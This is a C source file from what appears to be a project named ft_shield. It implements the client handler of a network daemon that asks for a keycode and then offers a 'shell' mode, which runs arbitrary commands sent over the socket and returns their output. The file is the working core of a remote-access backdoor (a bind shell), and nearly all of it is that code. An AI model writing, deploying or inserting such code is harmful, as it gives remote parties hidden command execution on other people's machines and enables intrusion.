
#include "ft_shield.h"
#include "daemon.h"
#include <stdio.h>
#include <string.h>

int cli_send(t_client *client, SOCKET socket, const char *buf, int len)
{
    int sent;

    sent = send(socket, buf, len, 0);
    if (sent > 0)
        client->bytes_out += sent;
    return sent;
}

int cli_send_str(t_client *client, SOCKET socket, const char *buf)
{
    return cli_send(client, socket, buf, (int)strlen(buf));
}

void client_reset(t_client *client, SOCKET socket)
{
    client->socket = socket;
    client->authenticated = 0;
    client->shell_mode = 0;
    client->bytes_in = 0;
    client->bytes_out = 0;
    client->cmd = cmd_init();
}

static int find_slot(t_client clients[], SOCKET socket)
{
    int slot;

    slot = 0;
    while (slot < MAX_CLIENTS && clients[slot].socket != socket)
        slot++;
    return slot;
}

void client_accept(SOCKET server_fd, t_client clients[], fd_set *fd_list)
{
    SOCKET client;
    int slot;

    client = accept(server_fd, NULL, NULL);
    if (client == INVALID_SOCKET)
    {
        return ;
    }
    slot = find_slot(clients, INVALID_SOCKET);
    if (slot == MAX_CLIENTS)
    {
        send(client, COLOR_RED "Server full\n" COLOR_RESET, 23, 0);
        closesocket(client);
        return ;
    }
    client_reset(&clients[slot], client);
    FD_SET(client, fd_list);
    cli_send_str(&clients[slot], client, COLOR_YELLOW "Keycode: " COLOR_RESET);
    log_write("CONNECT");
}

void client_disconnect(t_client clients[], SOCKET current, fd_set *fd_list)
{
    int slot;

    slot = find_slot(clients, current);
    if (slot == MAX_CLIENTS)
        return ;
    cmd_stop(&clients[slot].cmd);
    FD_CLR(current, fd_list);
    closesocket(current);
    client_reset(&clients[slot], INVALID_SOCKET);
    log_write("DISCONNECT (in: %ld, out: %ld)",
        clients[slot].bytes_in, clients[slot].bytes_out);
}

static void handle_auth(t_client *client, SOCKET socket, const char *buffer)
{
    if (verify_access(buffer))
    {
        client->authenticated = 1;
        log_write("AUTH OK");
        cli_send_str(client, socket, COLOR_GREEN "Authentication success\n" COLOR_RESET "$> ");
    }
    else
    {
        log_write("AUTH FAIL");
        cli_send_str(client, socket, COLOR_RED "Wrong keycode\n" COLOR_RESET COLOR_YELLOW "Keycode: " COLOR_RESET);
    }
}

static void handle_shell(t_client *client, SOCKET socket, const char *buffer)
{
    if (strcmp(buffer, "exit") == 0)
    {
        cmd_stop(&client->cmd);
        client->shell_mode = 0;
        cli_send_str(client, socket, COLOR_CYAN "Leaving shell\n" COLOR_RESET "$> ");
        return ;
    }
    log_write("SHELL: %s", buffer);
    if (!cmd_exec(&client->cmd, buffer))
        cli_send_str(client, socket, COLOR_RED "Failed to execute command\n" COLOR_RESET "shell> ");
    else if (!cmd_send_output(&client->cmd, socket))
        cli_send_str(client, socket, COLOR_RED "Failed to read command output\n" COLOR_RESET);
    else
        cli_send_str(client, socket, "\nshell> ");
}

static void handle_stats(t_client *client, SOCKET socket)
{
    char stats[96];

    snprintf(stats, sizeof(stats),
        "Received: %ld bytes | Sent: %ld bytes\n$> ",
        client->bytes_in, client->bytes_out);
    cli_send(client, socket, stats, (int)strlen(stats));
}

static void handle_shell_start(t_client *client, SOCKET socket)
{
    cmd_stop(&client->cmd);
    client->cmd = cmd_init();
    if (!cmd_start(&client->cmd))
    {
        cli_send_str(client, socket, COLOR_RED "Shell failed to start\n" COLOR_RESET "$> ");
        return ;
    }
    client->shell_mode = 1;
    cli_send_str(client, socket, COLOR_CYAN "Shell started\n" COLOR_RESET "shell> ");
}

static void handle_command(t_client *client, SOCKET socket, const char *buffer)
{
    if (strcmp(buffer, "?") == 0)
        cli_send_str(client, socket, help_message());
    else if (strcmp(buffer, "stats") == 0)
        handle_stats(client, socket);
    else if (strcmp(buffer, "shell") == 0)
        handle_shell_start(client, socket);
    else
    {
        log_write("CMD: %s", buffer);
        cli_send_str(client, socket, "Message received\n$> ");
    }
}

void client_handle(t_client clients[], SOCKET current, const char *buffer)
{
    int slot;

    slot = find_slot(clients, current);
    if (slot == MAX_CLIENTS)
        return ;
    if (!clients[slot].authenticated)
        handle_auth(&clients[slot], current, buffer);
    else if (clients[slot].shell_mode)
        handle_shell(&clients[slot], current, buffer);
    else
        handle_command(&clients[slot], current, buffer);
}
